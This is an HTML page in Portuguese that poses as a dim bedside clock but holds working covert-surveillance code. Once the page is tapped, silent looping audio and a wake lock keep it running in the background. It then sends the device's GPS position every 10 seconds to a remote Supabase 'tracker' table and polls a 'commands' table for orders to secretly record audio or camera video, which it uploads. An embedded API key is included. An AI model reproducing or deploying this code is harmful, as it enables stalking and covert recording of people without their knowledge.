<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#000">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta name="mobile-web-app-capable" content="yes">
<title>Relogio</title>
<link rel="manifest" href="manifest-clock.json">
<style>
  html,body{margin:0;height:100%;background:#000;overflow:hidden;display:flex;align-items:center;justify-content:center;flex-direction:column}
  #h{font-size:62px;color:#151515;font-family:monospace;user-select:none;-webkit-user-select:none}
  #s{font-size:12px;color:#222;margin-top:6px;font-family:monospace;user-select:none}
  #dot{position:fixed;top:8px;right:8px;width:6px;height:6px;border-radius:50%;background:#222;z-index:1}
  #dot.on{background:#0a0;box-shadow:0 0 4px #0a0}
</style>
</head>
<body>
<div id="dot"></div>
<div id="h">--:--</div>
<div id="s">toque para ativar</div>
<video id="v" autoplay muted playsinline style="width:1px;height:1px;opacity:0.01;position:fixed;top:0;left:0"></video>

<!-- Áudio silencioso em loop: o truque que mantém a aba ativa em segundo plano -->
<audio id="silentAudio" loop preload="auto" style="display:none">
  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
</audio>

<script>
// ===== CONFIG =====
const U = "https://jpaflbkafupwqfqfcjrv.supabase.co";
const K = "sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
const DEVICE_ID = "LG";
const CMD_POLL_MS = 4000;       // checa comandos a cada 4s
const GEO_POLL_MS = 10000;      // envia posição a cada 10s
const REC_DURATION_MS = 30000;  // gravação de 30s

// ===== STATE =====
let wakeLock = null;
let lastCmd = 0;
let lastGeoSent = 0;
let activated = false;

const $ = id => document.getElementById(id);
const setStatus = txt => $('s').innerText = txt;
const setDot = on => $('dot').className = on ? 'on' : '';

// ===== RELÓGIO =====
function clock() {
  $('h').innerText = new Date().toLocaleTimeString('pt-BR', {hour:'2-digit', minute:'2-digit'});
}
setInterval(clock, 1000);
clock();

// ===== WAKE LOCK =====
async function requestWakeLock() {
  try {
    if ('wakeLock' in navigator) {
      wakeLock = await navigator.wakeLock.request('screen');
      wakeLock.addEventListener('release', () => {
        if (activated && document.visibilityState === 'visible') {
          setTimeout(requestWakeLock, 200);
        }
      });
    }
  } catch (e) {}
}

// ===== ÁUDIO SILENCIOSO =====
function startSilentAudio() {
  const audio = $('silentAudio');
  audio.volume = 0.001;
  audio.muted = false;
  const p = audio.play();
  if (p && p.catch) p.catch(() => {});
}
// Re-toca se o navegador pausar
setInterval(() => {
  if (activated) {
    const audio = $('silentAudio');
    if (audio.paused) audio.play().catch(()=>{});
  }
}, 15000);

// ===== VISIBILITY CHANGE =====
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'visible' && activated) {
    requestWakeLock();
    startSilentAudio();
    checkCmd();
    sendGeo();
  }
});

// ===== UPLOAD =====
async function uploadBlob(blob, ext) {
  const name = `${DEVICE_ID}_${Date.now()}.${ext}`;
  try {
    await fetch(`${U}/storage/v1/object/videos/${name}`, {
      method: "POST",
      headers: {
        apikey: K,
        Authorization: "Bearer " + K,
        "x-upsert": "true",
        "Content-Type": blob.type
      },
      body: blob
    });
    setStatus("● enviado");
  } catch (e) { setStatus("erro upload"); }
}

// ===== GRAVAÇÃO =====
async function startRec(mode) {
  try {
    const constraints = mode === 'audio' ? {audio: true} : {video: {facingMode: "environment"}, audio: true};
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    $('v').srcObject = stream;
    const rec = new MediaRecorder(stream);
    let chunks = [];
    rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
    rec.onstop = async () => {
      const blob = new Blob(chunks, {type: mode === 'audio' ? 'audio/webm' : 'video/webm'});
      await uploadBlob(blob, 'webm');
      stream.getTracks().forEach(t => t.stop());
      $('v').srcObject = null;
    };
    rec.start();
    setStatus(mode === 'audio' ? "● gravando áudio..." : "● gravando vídeo...");
    setTimeout(() => { if (rec.state !== 'inactive') rec.stop(); }, REC_DURATION_MS);
  } catch (e) { setStatus("erro permissão câmera/mic"); }
}

// ===== CHECAR COMANDOS =====
async function checkCmd() {
  try {
    const r = await fetch(`${U}/rest/v1/comandos?device_id=eq.${DEVICE_ID}&order=created_at.desc&limit=1`, {
      headers: {apikey: K, Authorization: "Bearer " + K}
    });
    const d = await r.json();
    if (!d[0]) return;
    const t = new Date(d[0].created_at).getTime();
    if (t <= lastCmd) return;
    if (Date.now() - t > 60000) return;
    lastCmd = t;
    if (d[0].acao === 'audio') startRec('audio');
    if (d[0].acao === 'video') startRec('video');
  } catch (e) {}
}

// ===== GEO (polling com getCurrentPosition - mais robusto que watchPosition em background) =====
async function sendGeo() {
  if (!navigator.geolocation) return;
  if (Date.now() - lastGeoSent < 8000) return;
  lastGeoSent = Date.now();
  navigator.geolocation.getCurrentPosition(async p => {
    try {
      await fetch(`${U}/rest/v1/rastreador`, {
        method: "POST",
        headers: {
          apikey: K,
          Authorization: "Bearer " + K,
          "Content-Type": "application/json",
          Prefer: "resolution=merge-duplicates"
        },
        body: JSON.stringify({
          device_id: DEVICE_ID,
          lat: p.coords.latitude,
          lng: p.coords.longitude,
          updated_at: new Date().toISOString()
        })
      });
    } catch (e) {}
  }, err => {}, {enableHighAccuracy: true, maximumAge: 5000, timeout: 8000});
}

// ===== ESCUTA MENSAGENS DO SEU SW (se ele suportar periodic sync / push) =====
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.addEventListener('message', e => {
    if (!activated) return;
    if (e.data && (e.data.type === 'periodic-cmd-check' || e.data.type === 'push-check')) {
      checkCmd();
      sendGeo();
    }
  });
}

// ===== ATIVAR NO TOQUE =====
document.body.onclick = async () => {
  if (activated) return;
  activated = true;
  setDot(true);
  document.body.requestFullscreen?.();
  await requestWakeLock();
  startSilentAudio();
  sendGeo();
  setInterval(sendGeo, GEO_POLL_MS);
  checkCmd();
  setInterval(checkCmd, CMD_POLL_MS);
  setStatus("● ativo");
  document.body.onclick = null;
};
</script>
</body></html>
